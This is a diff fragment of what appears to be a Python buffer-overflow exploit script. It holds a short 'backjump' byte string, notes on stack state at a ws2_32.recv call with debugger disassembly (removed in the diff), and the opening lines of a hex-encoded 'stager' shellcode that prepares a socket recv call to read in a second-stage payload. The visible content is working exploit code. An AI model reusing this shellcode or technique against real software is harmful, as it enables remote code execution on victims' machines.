@@ -30,31 +30,15 @@ backjump = "\x04\x06\xFF\xD0"
                                             
 
 """                       
-socket stack on recv:
+stack state on call ws2_32.recv:
 Socket = 84                                
 Buffer = 003D4AC0
 BufSize = 1000
 Flags = 0   
 
 addr of ws2_32.recv = 00401953
-
-00BEF9C6   66:83EC 64       SUB SP,64
-00BEF9CA   33C0             XOR EAX,EAX
-00BEF9CC   33C9             XOR ECX,ECX
-00BEF9CE   80C5 04          ADD CH,4
-00BEF9D1   54               PUSH ESP
-00BEF9D2   58               POP EAX
-00BEF9D3   66:83C0 60       ADD AX,60
-00BEF9D7   52               PUSH EDX
-00BEF9D8   51               PUSH ECX
-00BEF9D9   50               PUSH EAX
-00BEF9DA   53               PUSH EBX
-00BEF9DB   B8 902C2540      MOV EAX,40252C90
-00BEF9E0   C1E8 08          SHR EAX,8
-00BEF9E3   FFD0             CALL EAX                                 ; <JMP.&WS2_32.recv>
 """
 
-#stager = "\x90"*4
 stager = "\x66\x83\xEC\x64"             # SUB SP,64     ; adjust stack to avoid corruption
 stager += "\x33\xC0"                    # XOR EAX,EAX   ; zero EAX
 stager += "\x33\xC9"                    # XOR ECX,ECX   ; zero ECX
